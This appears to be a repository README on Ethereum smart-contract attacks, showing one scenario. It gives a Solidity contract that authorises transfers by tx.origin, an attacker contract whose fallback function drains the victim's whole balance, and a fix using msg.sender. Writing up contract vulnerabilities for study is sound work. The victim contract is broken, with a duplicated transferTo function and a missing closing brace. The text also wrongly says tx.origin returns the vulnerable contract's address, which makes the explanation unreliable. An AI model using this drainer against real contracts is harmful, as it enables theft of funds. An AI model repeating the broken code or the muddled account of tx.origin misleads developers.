# EthereumDAOAttacks
EthereumDAOAttacks - Scenarios

This project lists all possible scenarios to attack a vulnerable Contracts

## Scenario-1:

Given: Vulnerable contract has public transfer method with check on transaction's origin 
       Attacker writes a fallback method to relay the transaction from vulnerable-contract to its own transfer method
       Attacker poses to be a genuine service provider and lures the vulnerable contract to send ether

When: Vulnerable contract sends ether to Attacker's Contract

Then: Attacker should pull entire ether to his/her own account

Description:

Vulnerable contract's transferTo Method:

```solidity

pragma solidity ^0.4.18;

contract TxOriginVictim {
address owner;

function TxOriginVictim() {
  owner = msg.sender;
}
function transferTo(address to, uint amount) public {
  require(tx.origin == owner);
  to.call.value(amount)();
}

function transferTo(address to, uint amount) public {
  require(tx.origin == owner);
  to.call.value(amount)();
}
function() payable public {}
```

Attacker's contract:

```
pragma solidity ^0.4.18;

interface TxOriginVictim {
  function transferTo(address to, uint amount);
}
contract TxOriginAttacker {
address owner;

function TxOriginAttacker() public {
  owner = msg.sender;
}
function getOwner() public returns (address) {
  return owner;
}
function() payable public {
  TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);
}
}
```

txn.origin always gives root/initiator of transaction which is the vulnerable's contract address (owner)
Attacker relays the transaction originated from vulnerable contract to its own transferTo method
Vulnerable contract just checks if the transaction is originated by it (owner), and sends ether to destinationAddress
Attacker walks-away with looten ether

Fix:
use msg.sender instead of txn.origin

txn.origin gives vulnerable contract's address in this scenario
Had this been msg.sender, then it would have ended with Attacker's contract address 

A -> B -> C -> A

A Called B & B called C & C Called A

In this scenario:
- txn.origin for C's call to A will give A
- msg.sender would give C instead of A

